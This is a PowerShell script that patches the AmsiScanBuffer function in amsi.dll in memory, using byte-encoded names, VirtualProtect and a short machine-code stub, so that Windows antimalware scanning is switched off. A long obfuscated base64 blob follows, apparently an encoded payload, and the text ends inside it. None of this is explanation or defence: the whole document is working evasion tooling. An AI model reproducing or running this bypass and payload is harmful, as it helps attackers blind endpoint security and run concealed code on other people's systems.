
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlRnt8ZXBnGB9uGB8YHzU1NTVOVnhxeXBhV3x7cXx7cj08SBgf
NTU1NUV0Z3R4NT0YHzU1NTU1NTU1TkV0Z3R4cGFwZz1FemZ8YXx6ezUoNSU5NVh0e3F0YXpnbDUo
NTFhZ2BwPEgYHzU1NTU1NTU1TkN0eXxxdGFwW3phW2B5eXpnUHhlYWw9PEgYHzU1NTU1NTU1TkZh
Z3x7ckgYHzU1NTU1NTU1MVZ6eHh0e3EYHxgfNTU1NTwYHzU1NTUxd3RmcCMhd3x7dGdsKDdBQ2RE
VFRYVFRUVFBUVFRUOjotVFRZclRUVFRUVFRUVERUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVHJUVFRUVCFzYHIhVGFUe1tcd3JXQVglfUNSfWV2bFdidngse3Z4
U2FcUlt9d3ggY3FWV3xPRldscUIhcnRCIXJHUCxBXFIkY09SQGBRRCVeX1RUVFRUVFRUVFdER0RU
VEFUUFFUUnpXLSxEVFRUVFRUVFRUVFpUVFxyVFlUQVRUVFdMVFRUVFxUVFRUVFRUVCN/RFRUVFRy
VFRUVERUVFRUVFdUVFRUclRUVFRUclRUV1RUVFRUVFRUVFRQVFRUVFRUVFRUVFZUVFRUVFRyVFRU
VFRUVFRYVERcQFRUV1RUVFdUVFRUVFRQVFRUUFRUVFRUVFRUV1RUVFRUVFRUVFRUVFRUVF92JVRU
V0VUVFRUVFBUVFRZYlNUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUUlRUVFRiVFRUUWZYYlRUWlRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
XFRUVFZUVFRUVFRUVFRUVFRUVFRWVlRUVFByVFRUVFRUVFRUVFRUVFRWICVPTX0lVFRUVC1XRFRU
VFRyVFRUVFNyVFRUVFxUVFRUVFRUVFRUVFRUVFRUVFRWVFRUUlRgdntbbExiVFRUWWJTVFRUVERU
VFRUVExUVFRUTFRUVFRUVFRUVFRUVFRUVFRUVFdUVFRXVFl7X3l3Uix/VFRUWFRUVFRUUlRUVFRU
VlRUVFRdclRUVFRUVFRUVFRUVFRUVFRUVERUVFREclRUVFRUVFRUVFRUVFRUVFRUVFRUUVlbVFRU
VFRUVFRQclRUVFRWVFRAVFlWWFRUWFREVFRUV1RUVFRXVFRUV3JUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRXZmJUYlddVFRUVFRE
VFRQR0Rec3IhVFRUellTcmJAUHJQRlR8clZUVFRSWUQtXFJTfk1bcllwXXJ2elFiVFRWcmdwU0Rx
PlFyVFRWfHJEVFRUXllUdl1eVFBUVFRMeCZUTGFXe1xXVFRXYlZyTGRUVFBEVFRUVlRUelRdRnZU
U0RUVFRUVHdYVEBUTFRQVFRUXFRUV1BWf3h+T1l/RFZ/eH5NWXwgbFRiVFR2VnJHVFRUXnZ/eldU
XVR6UERUVFZ7X1xURFdiXldQVFRUZWxvRFBUdlZyR1RUVF5TbHJGVFRUXnN9WFRUVHpec31YVFRU
ellzfVhUVFR6WFNyJVZTZXpeVHogZVJBWF5TYiVWUyB6WVR9fHRRVnJRVFRUUlBiRHpTVFRUVntY
Q1RUVF5QYkNjU3JUVFZ4LU1UVFReUGJMZ11XUFJ3bXJUVFRlJVBiVFRUR1hdUERAR1cnLU9UVFRe
d216VFRUekdXeC13VFRUXllxY3BTR1BScUdEVFRUUEFWV1BcWVR2R1ZSLXZUVFReJldQU3dtJVRU
VHpBVkZhIFByfnpdclRUVn1YXnN9WFRUVHpBVmJ+YVNyTEdXV1BednJQVFRdV2xURFRUdlZyUlRU
VFJeYmJSUERER1ZydlxeVExUVFRMQVYmXGFUcldidm0tVFRUekdWJy1yVFRUXlBiYnR/RC1UVFRQ
eVN7XyJUcldienxATVdkXHlSXV5fVHJXYnp8QE9QRGJCd2xQVFRUZHxeVlxUVFR6elBEVFRWfVxf
XlZYVFRUeiNwOjo6OiwhWlByez5TclxUVFdhY11UVFRWYWJkVEdiVFRUXFRyRFRlZHJUQ1RUVFRU
VFxUbFRWX0BEUFpUVFRUVFchVl5WRFRUVHpkUG9UU1RfUFRUVFRRVFRUR1NielNzfVhUVFR6el9E
VFRWfGJEUXJHPlBiVFRWfHJ5VFRUXllUXEJWe15lVHJXYlR7XCdUYldiXlZMVFRUellXfGJwUXJE
elZUVFRXfVhSV1RYU1BETEJ2bHZUVFR6WFBET2NeVFRUVnxmXVddWGVUVFReUV1cPlRiV2JTYnFv
XnJUVFZ8QFx3bGZUVFRlb1lUVFRWciQ+UGJUVFZ9WFNeYn5HV1ItYVRUVF5QYkBfd2whVFRUenlQ
YkRhIldQU15yVFRUV1hiVHJUZFRUVFRXVFRUUE1YY1RUVF5WclxZU3JiZ1Bidlx3b1RUVFR6W1dy
eWNYRFRUVnJyTUJUYlxXJy1sVFRUXlhgRFJefSFWXlR2VFRUTGRdclx6X1RUVFZ8elRUUF9BRn5c
V1RUUFRUVFRUVFRiVFRUVydYfCFiWX9AYltvXCZUVFRUVFRAVHdUVFRUWVRQVFRUf3NyVFRdVEBU
VFNyUlRUVH9AJkdsdEIge3ZiVFRUVFclVmJUVEBUWFRUVltDQGJRUFFyVFRQVFRUVFZbXUNAeVBU
VFRUJFQhVFRaYldUVFR/RHhtY0xyVFRUVFRUVFRUVlRUVFdDbSVWXVR+VlRUVFQ+clBvVFdMVFRU
UFRUVFR6VFRUVFdEVFRUVExUVFRUX1RUVFRRVFRUVFFcVFRUVF1UVFRUUURUVFRURFRUVFRXVFRU
VFRyVFRUVFxUVFRUV1RUVFRXVFRUVFRQVFRUVFRUUy1WVERUVFRUVFRXclFAVHQlUFdyV1dUZCVQ
V3JUfVRNZlBRYlF4V1RUVFdyV19UQHJRV3JWJlRAclFXclZMVEByUVdyVHpUfnJRV3JRJVRAclFX
clRbVH5yUVdyV3JUQHJRV3JUJFRMIVBXclRBVEwhUFdyVyJUQHJRV3JWbFd2QFZXclFYVGZAVldy
VFdUViVUV3JXQFdWUFNWclRTV0UlU1dyVlJUWEBWR2JXf1dUVFRRcld0VGJcU1ByUSNUZmJRUHJR
Y1QtYlFQcldxVFhiUVdyVyRUflRSV3JXJVdYQFZXclZzVHohUFdyVkZUWEBWV3JWPld2QFZXclZd
VGZAVlZyUXJUYyVTVnJXZFQ6JVNXclElVFZQU1ZyVCxXRSVTUXJRZVdEXFNRclZaVHJcU1ByVF5U
LWJRUHJRY1d2YlFQclFzVFhiUVRUVFRUVHJUVFRUVFRUUFRURFZXVEdUVFxUWEJXUSVUVERUV1RU
UFRQVFYlVH1MUEVEVFZUVERUVFRURFRXUFRTckQsVFRcVFdyVFZURFRUclRAVFRQUFRUclReVFNS
VHZiQHhURExSUkRUeFRDdFR/ckBlVEN0VEFUVGVUQ3RUYXJUZVRDdFR6YlRlVERUVFRUVlRUX1By
cURUYVREUFRUVFRUVFxUVH5GVGxUb1xXVHJXRFxUVFRUVFZCVF5iUUVUUFNUWURyVFRUVFRfTFQl
RF9UVERAVEVWXFRUVFRUfX19YFdUTFRXcldQXHJUVFRUVkJUVn5QR3JQUlRaRHxUVFRUVF9MVHdi
X0VURGZUUnxYVFRUVFR5cldlVFAtV1FUVHxcYlRUVFRWUlJSIVBXclRbVFRUVFREUT5UYlRUVERX
W1dUXFRUclF7VHJcVFRiVn5XRFRUVERRLFdUVFRURFFYVFRUVFRyUXtUclRUVGJUZFRXVERXVFR8
V1dURFdEV39XRFRUVERWVlRyVFRURFdkV0R+VHdyRFdUV1BUd3JEUlRXflR3ckReVFZ+VHdyRERU
UVBUd3JERFRRflR3ckREVFBQVHdyRERUUH5Ud3JERFRTUFR3ckREVFN+VHdyRERUUlBUd3JEQ1RS
flR3ckREVF1QVHdyRERUW35UeWJYfVRaUFR7VFh+VFt+VFhyTGVUWn5UJERXWVRFUFRgRENEVEV+
VEBUT0NUVFBXJHJfTFRUYlR3ckRSVFRQV0VyQ35UV1BXTFRHZFRfUFRsckNjVFd+V3hyV29UVGJU
RlRXJlRfUFQhVEMsVF5QVFZiUFJUVGJUTFRGV1RXRFRsckJEVFZQV3dyRERUVlBXLERGQ1RZUFRj
VF53VEV+VGRiQnxUV0RUIVRDLFRdflR3ckRSVEV+VF9ydCdURX5UZGJCLVRZflR3ckFRVFtQVFZi
UFJUWX5Ud3JERFRRfld3ckFFVFF+VyJyWUxUWFBUd3JBcFRYflR9RFtvVFhQVCRyTXlUW1BUd3JE
UlRFflRbVE1sVFtQVGJERSZURX5UeVRZLVRUclRXVFRGVERyVFFUVEZURHJUUFRUTVREclRTVFR2
VERyVFJUVH1URCFUX0RUVFRUIVReRFRUVFYhVFZiV0NURiFUUGJXcFRGIVRSYlcsVEYhVFxiVlJU
RiFUXmJWTVRGIVRYYlZNVEYhVFpiVk1URiFURGJWUlRGIVRGYlZxVEYhVEBiVk1URiFUQmJWTVRG
IVRMYlYkVEYhVHRiUXNUR3pUWWJWelRaelRlYl9wVFx6VFRUUFFUXUBUVERXUFREQFRYclhXVFRG
VFRUVFdUVFRUVFRUVFRUVFRUVFRUVFdMUFRUVFZUVFRUVFRUVFRUVFRUVFRUVEZQVFRUVFRUVFxU
VFRUVFRUVFRUVFRUVFR+V29ERFRUVFRUVHJUVFRUVFRUVFRUVFRUVFRUXVNUclRUVFRUUVRUQFRU
VFRUVFRUVFRUVFRUcHJUVFRUVFRUQFRUclRUVFRXWHRNWyVMUVBURVAkY09dQ2ZPQSFUQE1DeXZ7
eVBEYlcnTEJtJE9DLHNUUiRvTCcsbHdSeXxUUkd/VFNbIHYmR3l3RiBRdydtZk9CWyV0Qixgdmwg
XU9CIHl2eHl/VFBTfk9UV1pPTUdBT01HJHZTQ2B0eCxld3hDflRQQydPQiAlQHhDf3cmX35UUHF5
cVNXfXYmWyZ3Jl9+VFAgeXFQU2J0QF8kT3hPeXZ+T2xPQkBURkBHZXYmV2N2J1N8d1JAVEQnLGB2
JyxmT0RXe09NR3NBeFNhT0RXWk9NR0FPTUckdlBHY3dCU2V3fiB9d0JAVEF4QyVAJ0MlcU1XTXcm
X2dPJl9jcU1XWkxCJHlUXUNvT01fYExCJHlUU3FsdE1HeUFSeWBPRFdETE1HekNdeWJPRFdBcE1b
JU9CJWBEJyxsT0RXRk9CU35BJyBmcEBbY3dSbXlMJkdldycgVkxNW3lUUEdldiZXY3YnQFRHJkNl
T1BTJXFdX2VMe0MlT0RXUE9CXyRPJ3F9THhteURNRyV2eHl8cU1HeVRQW2N3Q09ldid5fHdSQ1dx
XUdsdEJfJHFSQFRETVtvT0IkfHddeUB0TUdmT0BTJXFdX2VMe0MlT0RXV3YmW3l3Ql9mcENHbExC
R3l3QlNsdCVTJXFdX2VMe0MlT0RXV3YmW3l3Ql9mcEBPZXdSQ0JPTV9vdEIsYERNRyV2eHl8cU1H
eVRQU292J0NhTHhtIEQnLGBPeHl7cU1ffXFSeWN3flMlcV1fZUx7QyVPRFdXdiZbeXdCX2ZwQEd5
didbbHRNVyV0QixgRE1HJXZ4eXxxTUd5VFBbY3dNV2V3UlMldEIsYEB4Q2ZMTX19cVJ5Y3d7W1dx
XUdsdEJfJHFSQFRETVtvT0IkfHddeUR2eCx+cUJbJURNRyV2eHl8cU1HeVRQU292J0NhTHhtIEQn
LGJwTV9lTyd9JURNRyV2eHl8cU1HeVRQU292J0NhTHhtIEQnLGF2UlNgcEBTJXFdX2VMe0MlT0RX
RnFCICV0QiR5RCcsYXZSUyV0Ql9ld1J5JXBAUyVxXV9lTHtDJU9EV0F0UlNsdlNbYHRNV3l2fCB5
cFJAVEQmX3lMTUd5QCdDf3FNX3lAJkdsdEIge1RSeWB2XUMlQCZHbHRCIHtUUCR9cVJbelRScXlx
UyxYT0Ige3FSclRBQlNsdid9fXdUV1pPTUd9dlJ+b1h8IH53UmJUQF1fY08mX313RFd7T01Hc0ZN
R3l3RFdBcE1bJU9CJVRHQiAkd0RXW0xCeWBUUHF5cVBbJHZ7X3l3e0dQdyckfXRCIVRPUixhTEJ5
YFRdW3lxUyxBT01bb3RCLGBUUEMnT0IgJUFSLHtAJ0Nvdid5Y3dyV0FPTVtvdEIsYERNQyV0UkNg
cVJ5f0xNR2V3JyFUR1IsYUxCeWBGQiB4dyZfYUxNR2V3JyFUQXhDJUcnQyVGeCxld355YE94LGx3
QlMldEIsYFRTWyB2Jkd5d0YgRk9CT2ZPQlsldEIsYFRQJH1xUlt6RCcsZndSQ39xUnljd3JXUHcn
JH10QiBRdycgJXZ4LGZ3UkNsRCcsZndSQ39xUnljd3JXUncmX2FMTUdQT01bf3Z4eWJxUnljd3JX
dE9NX2NUU1cldnlHY0AmR2x0QiB7RE1DJXdiV11PTUdQdyckfXRCIEV2eXFjdnhhe3Z4LCR2VFdX
dl1XeXd4R1F0UlNsVFNbIHYmR3l3RiBQdEJTe3d4LG9xUnl/dmwgU3F4Q2BxUnlgT2wgRk9CU35P
TVxUR01PeXd7R1h3J3FGT0JTfk9NXFREe0N4T3hDbFRQR2N3QlNld35bY3d7R2x3J21mT01cVEAn
fX12e1dBd3h5Yk9NXFRPUlMkdidDbFRTUyRPTV8gQHhDYXcmR3lEJyxhdl1DJU9NXFRHUnlsT0Jb
JXcmXyBAJ0NscXhDbFRdW3l2e095dnJXX0dCICR3QkNsTE1HY3ZyV11PTUdTd3tDYU9NX31xUixs
VFYgf3FSLGxUUHlgcVNXJXZyV0FwTVslT0IlYEdSeX1PJyBjdiZHZUwmWFRAJnlvcVJDYVl5XyR3
e0dld0JAYEZCICVPTV9jdlNbeXZ7T2VMJ0NvVFNbIHYmR3l3RiBGcUIgJXRCJHlZfltjd01XZXdS
Q2xAJ0NscXh5f09NWFRAJnlvcVJDYVl+R2V2eEN/cVIsbHBDW3l2e09lTCdDb1RQR3lMe0N7Tyd5
YE8lJGNPUkNvVFAkfXFSW3pPTVhUTE1fe3ZiV0FwTVslT0IlYENSQyFxViBGT0JxJHdSU2xHTX1i
dnhDb3YneWN3e1hUQCZ5b3FSQ2FZfltjd1JteUwmR2V3JyBvVFJxeXFTLFF0UlNsdmJXUnRCIH5E
Qm1mR1J5b0wnLCdPTV99THhteUdSLGFMQnlgRCcsYHFdX2N3Um15dntYVE9SU2JMTVtvVFJ9ZU8n
fWJMTVtvVFBDbHZ4LGxAJkN/TCdDb3ZiV1pPTUdedyd5YEAmR31xXUNvVFAgeXFTW3lxXUNiQ0Ig
Z3d4LCZ3eVslTE1HJHZiV29xUlMlcU1YVEQnLGBMJ1MlVFAsfHR4Q39xVFdTcFJ5JVRQQ2BxeHls
dycgYU9CICVUUnF5cVMsUXFNX2xPQiAlVFNfeUxCR1NxeENgcVRXW3cmT3lBeEMhcVRXRk9CcXlw
VFdTcXhDYHFQbWNPJFMkT01fIFRTWyB2Jkd5d0YgUHRNX3lMJkdjdnt5QU9NXyd0Qlt5dmwgV0wm
R2VxeENQdE1feUwmR2N2e35UdyZXc0dNUyRMQm1lcV1+VHcmV3NGQiB5dk1DfXdSeSVwRFdBcE1b
JU9CJWBAJ0N/cU1fZXFdflRHQiRicV1+VFRUVFRURFZXW0QlVFZyVFtUVHpUQGJXYFRSflR2VFd5
VF1cVFpyVHJUUExUdERXYFRSRFRcVFd6VFItVHZiVyVUUiFUTERXYVRSQFRcVFd9VFIhVE9UVHJU
UH5UQFRUclRSUFRPVFd+VF1cVE9EV29UXVhUXFRXY1RSTFRcVFdvVF1UVE9EV39UUn5UT3JXZVRS
WFRcVFckVF1YVE9EV2xUVlRUXlRXUVRQQFRBYlRyVFJAVHFUV39UVn5UXFRXZVRSIVRcVFdQVFIt
VHdEV31UUn5Ud3JUclRWclR2cld5VF1QVHFEV2VUXVxUT0RXb1RWVFRHVFdjVFIlVExEV2VUUiFU
XFRXV1RSRFR3RFdlVFIhVFxUV0ZUUn5UT2JXelRdRFR2YlRyVFItVHZyVHJUUERURGJUclRQQFRx
cld5VFIhVHFUV2ZUUi1UT2JXb1RWVFR3RFckVF1YVHFUVHJUUlxUT0RUclRdXFRPRFd9VFJEVExE
V3xUUmJUT0RUclRSXFRwRFRyVF1+VHdiVyRUXVxUXFRXJFRdWFRPRFdsVFYhVFRUJENUXVhUTERX
e1RSQFRaclRUclxbUVRdXFRPRFd+VFJAVHdyVyVUUn5UTERXZlRSQFRPVFRyVFBQVHFEVyVUUnJU
WnJUclRWVFRcVFdBVFIhVHREV2JUUkBUdnJUYFRSQFRwVFd5VFZUVENUV1dUU1xUR2JXU1RTRFRN
YldDVFNYVEdEV0ZUUCFURERXW1RQQFRcVFdQVFBQVENEV0FUUEBUQHJUclRQRFRERFdEVFBQVEBi
V0FUU3ZUQWJXRlRQRFRUUyxEVF1cVHdiV39UUkBUdmJXb1RWVFRDVFdjVFJmVE9EV2BUVlRURERX
JFRdRFR0VFQjVFZUVFxUV0FUUiFUdERXYlRSQFR2clRgVFJAVHBUV3lUVlRUQ1RXV1RTXFRHYldT
VFNEVE1iV0NUU1hUR0RXRlRQIVRERFdbVFBAVFRQJHZUUlxUTVRXflRdZlRYRFRmVFFYVHNEV3ZU
ViFUTVRXflRdZlRYRFRmVFFYVHNEV3ZUViFUTVRXflRdZlRYRFRmVFFYVHNEV3ZUViFUTVRXflRd
ZlRYRFRmVFFYVHNEV3ZUUlxUVFQkQ1RdWFRPRFdsVFF6VFxUVFRdbFRUWURUclRQflRAVFRyVFBQ
VE9UV35UXVxUT0RXb1RdWFRaclRyVFRSVHxselRCYldBVF1+VHZiVyVUUkBUd0RXd1RWclRHRFcn
VFJAVHdyVyVUUH5UR1RULFRRRFRbclRsVFFEVF5EV3FUVlRUTERXYFRSRFRcVFdTVF1MVE9EV2BU
XURUR1RXfVRdRFRMRFd3VFBEVExEVyVUUlBUQmJXVFRQIVRMRFdhVFJAVEVEVHtUU0RUTERXbFRS
dlRPRFclVFNAVHZiV3lUXVxUQXJXfVRSJVRPRFR7VFMlVEVEVHtUVFBdX2JXcVRTJVRUR1NBVFJA
VExiVyRUXVxUdERXJVRdflRUXXR3fSZHTERHIFx4IFRzWEwnYGRbdlRXVlRXVERyUVxUVFdXRlRX
VEdQR1dWVFdURCFQXFRQV1RyTF1UYiFMUEdEVld9clBUVFBaUlRAVFRyXExSV2ZdUUQhWlFyXFpT
R19TVEQhRkZHX1tQeVBDUENAV1FyIVpQeX5QVFRQV1FyRFRURFBcVHJMWldEVFRQelZXV0dARkdE
UFpXRlRUUHpWU1dWVFRQfn5RXFRUdlRsVFRRckByVERQQVRUWHJUVFxcXFRUQ1BDQFdQYlRTU0dT
Q1REIVBcVFRBVFRAclRHX09RckxyVEdeVHlEclNUVFBaXUdiW1didlZRfV9xUHhQRk9EIUZ0REBU
VHJcWlFyTFRUYiFaUXIhWVxUQFdRciFaUHh+R3JfflxcVFhXUX1SVHpEIVNcVFBXUHklUlxUUFdQ
elZxV1ZUVFB4QF1XYkRGdEQhXFRiRHJURFhcV1ZUV1REWFFcVFRcVllxI01TTE9bWlZfVllUOk0m
LUckRHojV1RUVFRUVFBURFRUVFREVlRUVFRXVFhUVFRUVldyclFXfVBAV1RUV1ZXcl9UVFhcUX1U
TFBXUEBUYlRUUXJAVFREUHFRcnJUV0QhWlFyIVpRckBUVEdfZVFycldUVHJUVFRUVFRXIVdUVFBU
Q1RcQkMmX312UCBjd35DIUwnQ2JxUnljd3lHenZ4LCZ2YlBcVERUVlRUVFRUVFREVERUWUAnfX12
e1dBd3h5Yk9NXFRUVEBXVFRUVFRXdldUV19RdyZXIHZ4eXt0XURyYmR+clxRXGJYQX5UVFZ+V1RW
R39aUl98WlFEYkxsJWJbUlt5WUFHfFt/VGFMQXZvW1YkeExCTG1bQlN8T39xfFhBclRUVGJXVFR2
bVl/VGBYViFiVFRUVFRUVFRUeDpveXJUVFRUVFZUVFRUdmJUVFRWRCVUVFR+U3JUVFRUVFRUVFRU
VFRUVFRUVFRQVFRUVFRUVFRUVFRUVFRUVFRUVFRTX0FHU0V5QGNUXXxefCRBIlhsbSJZRywkZSRU
RFRUVFBYI01TQ29PTV9vTVJTfndCeWBNUEdjcScgZncnU352JG1BdFJTbHZTW2B0TVd5dnwkYUxN
WyVPTV92QCd9fXZ7V0F3eHliT01cYXdCU29xUkNsTVIsfHR5bUZPQm15TE1beU1TW3pMTV9iQCcg
ZXZSQ2xZe1d+THJWOltUVFRUVFRUVFRUVFRUUU9bVFRUVFZUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRsb0RUVFRUVFRUVFRUVFRUVFRXc0QnLGxHTX15QUJTZXdyV2F2J1tjdnhDeVl4R2Z3
VFRUVFRUVFRFLXlUVldUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRW
VFdUVFRUVHJUVFZUUlRUVFRTVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUUFRURFRUVFFyVFRcVFRU
VFRUVFRUVFRUVFRUVFRUVFRQVFRUVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFBUVERUVFRS
clRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUUFRUVFRUVFliUVRUVkREVFRUWVRYVFRUVFRUVFRUVFRU
VFlUWCVUVFRUQ3JXQVRTLVRDcldTVFNcVEBiV19UUC1UQXJXc1RQflRBcldSVFAtVFRUVFRUWSVQ
IjohVFRUUFRUVFRXVFRUVFRUVFRUVFBUVFRUVFRRLVRUVFRUVFRUVFdUVFRUVFBUVFRUVFRUVFRU
VFRUVFRUVFRUV1BUVFRUVERXQlRSUFR2cldSVFJ+VHdUV3lUUH5Ud3JXeFRSLVRUVFRUVFZEVFdU
VFRUU0RUdnJXfVRSIVR2YldmVFJQVHFUV2VUUi1Ud3JUVFRUVFRUVFZiV1xiVlRUVFdUU1hUcVRX
bFRSflR3cld7VFBMVHREV2ZUUkBURkRXYFRSTFR3YlRUVFJyVlRUVFdUUVRUWFRUYlRRVFRYVFQl
VFJcVFhUVFRUV3pUVERUV1RQWFR3YldhVFIlVE9EV2BUXURUdmJUVFRUVFRUVFR8VFRQVFREV1FU
Ui1Ud0RXYlRSUFR3clcgVFAhVExEV2FUUkBUVFRUVFRUVFRUVFdUVFRiVFREV1JUUn5Ud1RXeVRQ
RFRPRFdvVFJYVHZyV2VUXVRUcVRXZVRSLVR3clRUVFRUVEBiV3pUUlBUdnJXYlRTWFR3cldlVF1U
VE9EV2xUVFRUWFRUXFRUUFRHcldlVFJiVE9EV0JUUkBUdnJXb1RSflR3YldgVFRUVFRUVG1UViFU
WFRUYFRRVFRZclRiVFRUVERUVERUVFBURkRXYFRdRFRPRFdsVFIhVExEV2ZUUCFUTERXYVRSQFRU
VFdBVFJyVExEV2xUXVRUQGJXYFRSflR2VFd5VF1cVFlyV3lUXXJUT0RUVFRQclRQclRXVFBiVE9E
V3tUUlBUd1RXUVRSLVR2VFcgVF1cVHREV3tUUnJUcVRUVFRQWFR3YldiVF1+VHZyV2VUUnZUdFRX
JVRWVFRkRFRyVFZUVFhyVGJUUVBUWkRUVFRWelRURFRXVFBiVE9EV3tUUlBUd1RXQFRdXFRMRFd+
VFJAVHdEV31UXVxUdGJXb1RUVFRUVFRUVFRUVEZUVERUVFBUQWJXbFRSflRPYldlVFIhVExEV2ZU
UExUdERXZlRSQFR3cld9VFIlVE9EVFRUU1hUdFRXfVRdXFR2VFdBVFIhVHREV2JUUkBUdnJUYFRS
QFRwVFd5VFRUVFpUVFhUVFBUQFRXbFRSLVRPVFckVFJYVHFUV1pUUlBUd0RXeVRUVFRUVFdBVFJy
VExEV2xUXVRUQGJXYFRSflR2VFd5VF1cVFRUVCVUVHJUVERXRFRdXFR3Yld+VF1AVExiVyVUU0xU
T0RXbFRdWFR0RFdjVFIhVFRUVG1UViFUWFRUYFRRVFRZclRiVFRUVFpUVFxUVFBURERXb1RdWFRP
RFdhVFJcVHdUVyBUVlRUQ3JXeVRdXFR2YldlVFItVHdyVFRUUVBUWXJUYlRWIVRYVFRgVFFUVFRU
UVhEYlRUI3JQVFRUVFRUVFRUVFRUVCIiYDpFUSwhd0JicnF4Q2x2J3ljd38lfFhGIWJcfFd5d3hb
Y09SeWBPbyV8Q0NHUllBcnxcXVslTEIgfkxCbWN3eEAsXHt5eXZsXDpFciVeUUR6LUxNW29PQiR8
d11+cnBSJGZ3e1gsXHtDbHd/ZW9MJ315d0JTb1lCJGVMJl9jdicseHFWJH93JyUjTE1bYVl7TG1c
fFdhTEIgZU94Q29xU095dntbZXcnISxcf1BgWFZcPlFEenJcUW19diZbeXdCX2ZwQHl+T0IgJXRN
RyBcXU95dntbZXcnISxcf1BgWFYhYll/VHxcUiB9d0JALFx+JCBETVdid1J5f0xNR2V3JyFgTE1X
Ylx8LT5RRHpyXFFtJXZ7Q29xUHlgT3gtcnBSJGZ3e1gsXHtDbHd/ZW9MJ315d0JTb1lCJGVMJl9j
dicseHFWJH93JyUjTE1bYVl7TGxcfyFbVnxUclxWVC12J0N/cU1fZXFdfj5RRHpyXFZUclxWVC12
eENtcUJDb3FSQ35AXV9lcXh5Zk9CcXl2bFchd0JtYHZvJXxxTV9gWntbf3RSQ2FMTVhhd0J5f3Z4
LG93J08lWUJbY3dBZX12JyVgcX9YfEVyJV5cVlRyXFZUclxWVC12eENtcUJDb3FSQ35HTX15TCZD
JXRCLGBBUkMnT0JicndSQydPQmIsXHhTb0ZCICd3J2F5dnxccnFCeVdMJ1t5diZYLFx4T313XVt5
XHwtPlFEenJcVlRyXFZULVkmX3l2TUN5diZHeU9TV2x0TU9ld1JDe09NWD5RRHpyXFZUckVWLG9P
Qlskdnh5JXBBIVtWfFRyRVYsJXZ7Q29xUHlgT3gtPlFEei1ZJ1NvdidDYUx4bSBFclRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFFUVFRUYlRUVFFmW1RUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
